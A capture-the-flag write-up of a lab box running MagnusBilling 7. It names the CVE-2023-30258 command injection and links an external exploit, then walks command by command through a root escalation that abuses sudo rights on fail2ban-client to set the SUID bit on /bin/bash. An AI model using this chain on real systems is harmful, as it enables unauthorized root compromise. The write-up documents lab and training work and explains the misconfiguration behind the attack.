## 🧾 Overview
Some mistakes can be costly.\
Gain a shell, find the way and escalate your privileges!\
Note: Bruteforcing is out of scope for this room.


## 🔍 Recon
Let's start with basic scan:
```bash
nmap -T4 -n -sC -sV -Pn -p- 10.10.160.86
Not shown: 65528 closed tcp ports (reset)
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp    open     http     Apache httpd 2.4.56 ((Debian))
| http-title:             MagnusBilling
|_Requested resource was http://10.10.160.86/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)
| http-robots.txt: 1 disallowed entry
|_/mbilling/
3306/tcp  open     mysql    MariaDB (unauthorized)
5038/tcp  open     asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## 🌐 Web Enumeration
Port 80 hosts an Apache web server serving MagnusBilling, as revealed by the page title and /robots.txt disallowing /mbilling/. I visit the directory and find a login page. Furthermore, I can see the name MagnusBilling in the title.\
**● MagnusBilling is an open-source VoIP billing system used by telecom providers to manage customer accounts, process payments, and track call records. It integrates with Asterisk PBX for call management and automated billing.**\
By checking common application files, I identify the MagnusBilling version as 7.x.x from the README.md file.

## 🛡️ Vulnerability Analysis
Searching for vulnerabilities in MagnusBilling 7, I discover it is vulnerable to CVE-2023-30258, an unauthenticated command injection vulnerability. A detailed advisory for this vulnerability with a proof-of-concept (PoC) is available [here](https://eldstal.se/advisories/230327-magnusbilling.html).

## 🚀 Exploitation
I used this exploit(https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit).\
Follow the guide and eventually you will get the shell as asterisk. Now we have to stabilize the shell.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Now just visit the home directory of magnus and you'll find the user flag 🚩

## 🧑‍💻 Privilege Escalation
After gaining initial access as the asterisk user, I needed to escalate privileges to root. Time to enumerate.
**● Finding the Path**
First thing I always do after getting a foothold - check what I can run with sudo:
```bash
sudo -l
```
The output showed something interesting:
```bash
User asterisk may run the following commands on ip-10-10-28-254:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```
This immediately caught my attention. Fail2ban-client is a powerful tool that manages banning rules, and it needs root privileges to modify firewall rules. If I can run it as root without a password, there's definitely a way to abuse this.

**● Understanding Fail2ban**\
Fail2ban works by monitoring logs for suspicious activity (like failed login attempts) and automatically banning IPs by executing actions. These actions are basically shell commands that run as root.\
The key insight: if I can modify an action and then trigger it, I can execute arbitrary commands as root.

**● Checking the Configuration**\
I started by checking what jails (monitoring rules) were configured:
```bash
sudo /usr/bin/fail2ban-client status
```
Found an interesting jail called asterisk-iptables. Let me see what actions it has:
```bash
sudo /usr/bin/fail2ban-client get asterisk-iptables actions
```
```bash
The jail asterisk-iptables has the following actions:
iptables-allports-ASTERISK
```
Now let's check what the current actionban command does:
```bash
sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
```
```bash
<iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>
```
This is the default legitimate action - it adds iptables rules to block IPs. But since I have sudo access to fail2ban-client, I can change this action to execute any command I want.

## 🧾My plan:
1. Modify the actionban to run chmod +s /bin/bash instead of iptables rules
2. Trigger the ban action by banning any IP
3. This executes chmod +s /bin/bash as root, adding the SUID bit to bash
4. Spawn a privileged shell using the SUID bash

**Step 1: Modify the action**
```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
```
**Step 2: Verify the change**
```bash
sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
```
```bash
chmod +s /bin/bash
```
Perfect! The action is now malicious.

**Step 3: Check bash permissions (before triggering)**
```bash
ls -la /bin/bash
```
```bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```
Normal permissions - no SUID bit yet.

**Step 4: Trigger the action**
```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
```
Success! This triggered the actionban command, which executed chmod +s /bin/bash as root.

**Step 5: Verify SUID bit was set**
```bash
ls -la /bin/bash
```
```bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```
Excellent! Notice the s in -rwsr-sr-x. That's the SUID bit, meaning bash will now run with the owner's permissions (root).

## Getting Root
Now spawn a root shell with the -p flag (preserve privileges):
```bash
/bin/bash -p
```
The prompt changed from $ to # - I'm root!

## Why This Worked
The privilege escalation chain:

1. Sudo permission - I could run fail2ban-client as root without a password
2. Action modification capability - Fail2ban-client allows changing action commands
3. Command injection - I replaced the legitimate iptables command with chmod +s /bin/bash
4. Action trigger - Banning an IP executed my malicious command as root
5. SUID exploitation - Once bash had the SUID bit, it could be executed with root privileges
6. Preserved privileges - The -p flag prevented bash from dropping privileges

The critical mistake here was allowing a low-privilege user to run fail2ban-client with full sudo access. This tool can modify its own action configurations, essentially giving anyone with sudo access the ability to execute arbitrary commands as root.

Root flag: /root/root.txt ✓
